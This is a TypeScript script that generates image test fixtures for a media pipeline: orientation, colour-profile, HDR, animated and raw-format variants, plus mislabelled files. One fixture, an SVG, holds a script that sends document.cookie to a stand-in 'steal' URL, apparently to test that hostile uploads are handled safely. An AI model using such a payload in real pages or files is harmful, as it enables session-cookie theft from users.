#!/usr/bin/env node
/**
 * Regenerates the committed photo fixtures in this directory (docs/media-pipeline.md §8
 * "Generated photo fixtures"). Run from the repository root:
 *
 *   node tests/fixtures/photo/generate.ts
 *
 * Node ≥ 22.18 runs the TypeScript directly. Needs sharp (node_modules), exiftool, heif-enc with
 * the x265 and aom encoders (libheif-plugin-x265, libheif-plugin-aomenc) and ffmpeg with libjxl,
 * libopenjpeg, libaom-av1, bmp and apng.
 * The outputs are committed, so CI never needs the encoders. Colours and metadata come from
 * tests/helpers/photo-fixtures.ts, which the tests use for their expectations.
 */
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import sharp, { type Sharp } from 'sharp';
import {
	FRAMES,
	OTHER_EXIF,
	PATCH,
	PATCHES,
	PATCHES_ACROSS,
	PHOTO_FIXTURES as OUT,
	QUAD,
	QUAD_EXIF,
	QUAD_SMALL,
	type Rgb
} from '../../helpers/photo-fixtures.ts';
import { displayP3Icc } from '../../../src/worker/photo/icc.ts';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'fp-photo-fixtures-'));
const out = (name: string) => path.join(OUT, name);
const scratch = (name: string) => path.join(tmp, name);

function run(cmd: string, args: string[]): void {
	execFileSync(cmd, args, { stdio: ['ignore', 'ignore', 'inherit'] });
}

const exiftool = (...args: string[]) => run('exiftool', ['-q', '-overwrite_original', ...args]);

/** Raw RGB quadrant image of the given size. */
function quadRaw({ width, height }: { width: number; height: number }): Sharp {
	const buf = Buffer.alloc(width * height * 3);
	for (let y = 0; y < height; y++) {
		for (let x = 0; x < width; x++) {
			const c = y < height / 2 ? (x < width / 2 ? QUAD.tl : QUAD.tr) : x < width / 2 ? QUAD.bl : QUAD.br;
			c.forEach((v, i) => (buf[(y * width + x) * 3 + i] = v));
		}
	}
	return sharp(buf, { raw: { width, height, channels: 3 } });
}

/** The image with a fully transparent centre (real transparency). */
async function withHole(image: Sharp): Promise<Sharp> {
	const { data, info } = await image.ensureAlpha().raw().toBuffer({ resolveWithObject: true });
	for (let y = info.height / 4; y < (3 * info.height) / 4; y++) {
		for (let x = info.width / 4; x < (3 * info.width) / 4; x++) data[(y * info.width + x) * 4 + 3] = 0;
	}
	return sharp(data, { raw: { width: info.width, height: info.height, channels: 4 } });
}

function patchesRaw(): Sharp {
	const width = PATCH * PATCHES_ACROSS;
	const height = PATCH * Math.ceil(PATCHES.length / PATCHES_ACROSS);
	const buf = Buffer.alloc(width * height * 3);
	for (let y = 0; y < height; y++) {
		for (let x = 0; x < width; x++) {
			const c = PATCHES[Math.floor(y / PATCH) * PATCHES_ACROSS + Math.floor(x / PATCH)];
			c.forEach((v, i) => (buf[(y * width + x) * 3 + i] = v));
		}
	}
	return sharp(buf, { raw: { width, height, channels: 3 } });
}

const frame = (rgb: Rgb) => sharp({ create: { width: 64, height: 48, channels: 3, background: { r: rgb[0], g: rgb[1], b: rgb[2] } } }).png().toBuffer();

const QUAD_TAGS = [
	`-DateTimeOriginal=${QUAD_EXIF.dateTimeOriginal}`,
	`-CreateDate=${QUAD_EXIF.dateTimeOriginal}`,
	`-OffsetTimeOriginal=${QUAD_EXIF.offsetTimeOriginal}`,
	'-SubSecTimeOriginal=123',
	`-GPSLatitude=${Math.abs(QUAD_EXIF.gpsLat)}`,
	`-GPSLatitudeRef=${QUAD_EXIF.gpsLat >= 0 ? 'N' : 'S'}`,
	`-GPSLongitude=${Math.abs(QUAD_EXIF.gpsLon)}`,
	`-GPSLongitudeRef=${QUAD_EXIF.gpsLon >= 0 ? 'E' : 'W'}`,
	`-GPSAltitude=${QUAD_EXIF.gpsAlt}`,
	'-GPSAltitudeRef=0',
	`-Make=${QUAD_EXIF.make}`,
	`-Model=${QUAD_EXIF.model}`
];
const OTHER_TAGS = [`-DateTimeOriginal=${OTHER_EXIF.dateTimeOriginal}`, `-Make=${OTHER_EXIF.make}`, `-Model=${OTHER_EXIF.model}`];

// --- Quadrants: 8 orientations as JPEG and HEIC, P3 JPEG/HEIC, grey and CMYK JPEG ----------------
await quadRaw(QUAD).jpeg({ quality: 92 }).toFile(scratch('quad.jpg'));
exiftool(...QUAD_TAGS, scratch('quad.jpg'));
for (let n = 1; n <= 8; n++) {
	fs.rmSync(out(`o${n}.jpg`), { force: true }); // exiftool -o never overwrites
	run('exiftool', ['-q', `-Orientation#=${n}`, '-o', out(`o${n}.jpg`), scratch('quad.jpg')]);
	run('heif-enc', ['-q', '90', out(`o${n}.jpg`), '-o', out(`o${n}.heic`)]);
}
fs.writeFileSync(scratch('display-p3.icc'), displayP3Icc());
await quadRaw(QUAD).withIccProfile(scratch('display-p3.icc')).jpeg({ quality: 92 }).toFile(out('p3.jpg'));
exiftool(...QUAD_TAGS, out('p3.jpg'));
run('heif-enc', ['-q', '90', out('p3.jpg'), '-o', out('p3.heic')]);
await quadRaw(QUAD).greyscale().jpeg({ quality: 92 }).toFile(out('grey.jpg'));
// No embedded profile (the built-in CMYK one is ~1 MB): decoders fall back to a generic CMYK profile.
await quadRaw(QUAD).toColourspace('cmyk').jpeg({ quality: 92 }).toFile(out('cmyk.jpg'));
exiftool(...QUAD_TAGS, out('cmyk.jpg'));

// --- Colour patches: plain PNG, BT.709 limited-range HEIC, P3-by-nclx HEIC, lossless GBR AVIF ----
await patchesRaw().png().toFile(out('patches.png'));
run('heif-enc', ['-q', '95', '--matrix_coefficients=1', '--full_range_flag=0', out('patches.png'), '-o', out('bt709-limited.heic')]);
run('heif-enc', ['-q', '95', '--colour_primaries=12', '--matrix_coefficients=6', '--full_range_flag=1', out('patches.png'), '-o', out('p3-nclx.heic')]);
run('heif-enc', ['-A', '-L', '-p', 'chroma=444', '--matrix_coefficients=0', out('patches.png'), '-o', out('gbr-lossless.avif')]);
const mc = execFileSync('exiftool', ['-s3', '-n', '-MatrixCoefficients', out('gbr-lossless.avif')], { encoding: 'utf8' }).trim();
if (mc !== '0') throw new Error(`gbr-lossless.avif has matrix_coefficients=${mc}, expected 0`);

// --- 16 bits per sample: PNG with EXIF Orientation 6, 10-bit HLG (HDR) HEIC ----------------------
fs.writeFileSync(scratch('deep.rgb48'), rgb48(QUAD_SMALL));
const deepPng = (file: string) =>
	run('ffmpeg', ['-v', 'error', '-y', '-f', 'rawvideo', '-pix_fmt', 'rgb48be', '-s', `${QUAD_SMALL.width}x${QUAD_SMALL.height}`, '-i', scratch('deep.rgb48'), '-frames:v', '1', '-c:v', 'png', '-pix_fmt', 'rgb48be', file]);
deepPng(out('orient6-16bit.png'));
exiftool('-Orientation#=6', out('orient6-16bit.png'));
deepPng(scratch('deep.png'));
run('heif-enc', ['-q', '90', '-b', '10', '--colour_primaries=9', '--transfer_characteristic=18', '--matrix_coefficients=9', '--full_range_flag=0', scratch('deep.png'), '-o', out('hlg.heic')]);

// --- PNG with EXIF Orientation 6; still and animated GIF; APNG ------------------------------------
await quadRaw(QUAD).png().toFile(out('orient6.png'));
exiftool('-Orientation#=6', ...QUAD_TAGS, out('orient6.png'));
await quadRaw(QUAD).gif().toFile(out('still.gif'));
const frames = await Promise.all(FRAMES.map(frame));
await sharp(frames, { join: { animated: true } }).gif({ loop: 0, delay: 100 }).toFile(out('anim.gif'));
frames.forEach((f, i) => fs.writeFileSync(scratch(`frame${i + 1}.png`), f));
run('ffmpeg', ['-v', 'error', '-y', '-framerate', '10', '-i', scratch('frame%d.png'), '-plays', '0', '-f', 'apng', out('anim.png')]);
// An AVIF image sequence ('avis' brand): ffmpeg also stores the first frame as the primary still.
run('ffmpeg', [
	'-v', 'error', '-y', '-framerate', '10', '-i', scratch('frame%d.png'),
	'-vf', 'scale=out_color_matrix=bt601:out_range=tv,format=yuv420p',
	'-color_primaries', 'bt709', '-color_trc', 'iec61966-2-1', '-colorspace', 'smpte170m', '-color_range', 'tv',
	'-c:v', 'libaom-av1', '-crf', '10', '-cpu-used', '8', '-f', 'avif', out('sequence.avif')
]);

// --- WebP: lossy, lossless, lossy with transparency, animated -----------------------------------
await quadRaw(QUAD).webp({ quality: 90 }).toFile(out('lossy.webp'));
exiftool(...QUAD_TAGS, out('lossy.webp'));
await patchesRaw().webp({ lossless: true }).toFile(out('lossless.webp'));
await (await withHole(quadRaw(QUAD))).webp({ quality: 90 }).toFile(out('alpha.webp'));
await sharp(frames, { join: { animated: true } }).webp({ loop: 0, delay: 100, lossless: true }).toFile(out('anim.webp'));

// --- TIFF (with EXIF), BMP, JPEG XL, JPEG 2000, PSD ---------------------------------------------
await quadRaw(QUAD).tiff({ compression: 'lzw' }).toFile(out('quad.tif'));
exiftool(...OTHER_TAGS, out('quad.tif'));
await quadRaw(QUAD).png().toFile(scratch('quad.png'));
await quadRaw(QUAD_SMALL).png().toFile(scratch('quad-small.png'));
run('ffmpeg', ['-v', 'error', '-y', '-i', scratch('quad-small.png'), '-c:v', 'bmp', '-pix_fmt', 'bgr24', out('quad.bmp')]);
run('ffmpeg', ['-v', 'error', '-y', '-i', scratch('quad.png'), '-c:v', 'libjxl', '-distance', '1', out('quad.jxl')]);
run('ffmpeg', ['-v', 'error', '-y', '-i', scratch('quad.png'), '-c:v', 'libopenjpeg', '-format', 'jp2', out('quad.jp2')]);
fs.writeFileSync(out('quad.psd'), psd(QUAD_SMALL, await quadRaw(QUAD_SMALL).raw().toBuffer()));

// --- Synthetic DNGs: a 1600 px JPEG preview (Orientation 6) and one too small to use -------------
const DNGS: [name: string, width: number, height: number][] = [
	['preview.dng', 1600, 1200],
	['small-preview.dng', 800, 600]
];
for (const [name, width, height] of DNGS) {
	const jpeg = await quadRaw(QUAD).resize(width, height, { kernel: 'nearest' }).jpeg({ quality: 50 }).toBuffer();
	fs.writeFileSync(out(name), dng(jpeg, width, height));
	exiftool(...OTHER_TAGS, '-Orientation#=6', out(name));
}

// --- Mislabelled files and things that are not photos -------------------------------------------
fs.copyFileSync(out('o1.jpg'), out('jpeg-labelled.heic'));
fs.copyFileSync(out('o1.heic'), out('heic-labelled.jpg'));
fs.writeFileSync(out('not-a-photo.pdf'), minimalPdf());
fs.writeFileSync(out('page.html'), '<!doctype html>\n<html><head><title>Hello</title></head><body><p>Not a photo.</p></body></html>\n');
fs.writeFileSync(
	out('drawing.svg'),
	'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="64" height="48">\n' +
		'  <script>fetch("https://example.com/steal?c=" + document.cookie)</script>\n' +
		'  <image href="https://example.com/tracker.png" width="64" height="48"/>\n' +
		'  <rect width="32" height="24" fill="red"/>\n</svg>\n'
);
fs.writeFileSync(out('page-labelled.jpg'), fs.readFileSync(out('page.html')));

fs.rmSync(tmp, { recursive: true, force: true });
console.log(`photo fixtures written to ${OUT}`);

// -------------------------------------------------------------------------------------------------

/** Big-endian 16-bit RGB samples with low bits set, so an 8-bit round trip would show. */
function rgb48({ width, height }: { width: number; height: number }): Buffer {
	const buf = Buffer.alloc(width * height * 6);
	for (let y = 0; y < height; y++) {
		for (let x = 0; x < width; x++) {
			const i = (y * width + x) * 6;
			buf.writeUInt16BE(x * 1000 + 7, i);
			buf.writeUInt16BE(y * 1300 + 3, i + 2);
			buf.writeUInt16BE(((x * 37 + y * 101) * 11) % 65536, i + 4);
		}
	}
	return buf;
}

/** Uncompressed 8-bit RGB PSD (header, empty sections, planar composite image data). */
function psd({ width, height }: { width: number; height: number }, rgb: Buffer): Buffer {
	const header = Buffer.alloc(26);
	header.write('8BPS', 0, 'latin1');
	header.writeUInt16BE(1, 4); // version
	header.writeUInt16BE(3, 12); // channels
	header.writeUInt32BE(height, 14);
	header.writeUInt32BE(width, 18);
	header.writeUInt16BE(8, 22); // depth
	header.writeUInt16BE(3, 24); // RGB
	const empty = Buffer.alloc(12); // colour mode data, image resources, layer and mask info: all length 0
	const planes = Buffer.alloc(2 + width * height * 3); // compression 0 = raw
	for (let i = 0; i < width * height; i++) for (let c = 0; c < 3; c++) planes[2 + c * width * height + i] = rgb[i * 3 + c];
	return Buffer.concat([header, empty, planes]);
}

/**
 * A minimal DNG: IFD0 is a JPEG-compressed reduced-resolution preview (as cameras write it), with a
 * tiny 16-bit CFA raw image in a SubIFD. Little-endian TIFF.
 */
function dng(jpeg: Buffer, width: number, height: number): Buffer {
	const raw = Buffer.alloc(16 * 12 * 2, 0x10);
	return tiff(
		[
			[
				[254, 'LONG', [1]],
				[256, 'LONG', [width]],
				[257, 'LONG', [height]],
				[258, 'SHORT', [8, 8, 8]],
				[259, 'SHORT', [7]],
				[262, 'SHORT', [6]],
				[271, 'ASCII', OTHER_EXIF.make],
				[272, 'ASCII', OTHER_EXIF.model],
				[273, 'LONG', (l) => [l.blocks[0]]],
				[277, 'SHORT', [3]],
				[278, 'LONG', [height]],
				[279, 'LONG', [jpeg.length]],
				[330, 'LONG', (l) => [l.ifds[1]]],
				[50706, 'BYTE', [1, 4, 0, 0]],
				[50707, 'BYTE', [1, 1, 0, 0]],
				[50708, 'ASCII', `${OTHER_EXIF.make} ${OTHER_EXIF.model}`]
			],
			[
				[254, 'LONG', [0]],
				[256, 'LONG', [16]],
				[257, 'LONG', [12]],
				[258, 'SHORT', [16]],
				[259, 'SHORT', [1]],
				[262, 'SHORT', [32803]],
				[273, 'LONG', (l) => [l.blocks[1]]],
				[277, 'SHORT', [1]],
				[278, 'LONG', [12]],
				[279, 'LONG', [raw.length]],
				[33421, 'SHORT', [2, 2]],
				[33422, 'BYTE', [0, 1, 1, 2]]
			]
		],
		[jpeg, raw]
	);
}

type TagType = 'BYTE' | 'ASCII' | 'SHORT' | 'LONG';
interface Layout {
	ifds: number[];
	blocks: number[];
}
type Entry = [tag: number, type: TagType, values: number[] | string | ((layout: Layout) => number[])];

/** Little-endian TIFF writer: IFDs of [tag, type, values | (layout) => values], then data blocks. */
function tiff(ifds: Entry[][], blocks: Buffer[]): Buffer {
	const TAG_SIZE: Record<TagType, number> = { BYTE: 1, ASCII: 1, SHORT: 2, LONG: 4 };
	const TAG_CODE: Record<TagType, number> = { BYTE: 1, ASCII: 2, SHORT: 3, LONG: 4 };
	const zeros: Layout = { ifds: ifds.map(() => 0), blocks: blocks.map(() => 0) };
	const valuesOf = (v: Entry[2], layout: Layout): number[] =>
		typeof v === 'function' ? v(layout) : typeof v === 'string' ? [...Buffer.from(v + '\0', 'latin1')] : v;
	const bytesOf = ([, type, v]: Entry) => valuesOf(v, zeros).length * TAG_SIZE[type];
	const layout: Layout = { ifds: [], blocks: [] };
	let pos = 8;
	for (const ifd of ifds) {
		layout.ifds.push(pos);
		pos += 2 + ifd.length * 12 + 4 + ifd.reduce((n, e) => n + (bytesOf(e) > 4 ? bytesOf(e) + (bytesOf(e) & 1) : 0), 0);
	}
	for (const b of blocks) {
		layout.blocks.push(pos);
		pos += b.length + (b.length & 1);
	}
	const buf = Buffer.alloc(pos);
	buf.write('II', 0, 'latin1');
	buf.writeUInt16LE(42, 2);
	buf.writeUInt32LE(layout.ifds[0], 4);
	ifds.forEach((ifd, k) => {
		let p = layout.ifds[k];
		let extra = p + 2 + ifd.length * 12 + 4;
		buf.writeUInt16LE(ifd.length, p);
		p += 2;
		for (const [tag, type, v] of ifd) {
			const values = valuesOf(v, layout);
			const size = TAG_SIZE[type];
			const bytes = values.length * size;
			buf.writeUInt16LE(tag, p);
			buf.writeUInt16LE(TAG_CODE[type], p + 2);
			buf.writeUInt32LE(values.length, p + 4);
			let at = p + 8;
			if (bytes > 4) {
				buf.writeUInt32LE(extra, p + 8);
				at = extra;
				extra += bytes + (bytes & 1);
			}
			values.forEach((x, i) => {
				if (size === 1) buf.writeUInt8(x, at + i);
				else if (size === 2) buf.writeUInt16LE(x, at + i * 2);
				else buf.writeUInt32LE(x, at + i * 4);
			});
			p += 12;
		}
		buf.writeUInt32LE(0, p); // no next IFD (the raw image is linked as a SubIFD)
	});
	blocks.forEach((b, i) => b.copy(buf, layout.blocks[i]));
	return buf;
}

function minimalPdf(): string {
	const objects = [
		'<< /Type /Catalog /Pages 2 0 R >>',
		'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
		'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 64 48] >>'
	];
	let body = '%PDF-1.4\n';
	const offsets = objects.map((o, i) => {
		const at = body.length;
		body += `${i + 1} 0 obj\n${o}\nendobj\n`;
		return at;
	});
	const xref = body.length;
	body += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
	body += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
	return body;
}
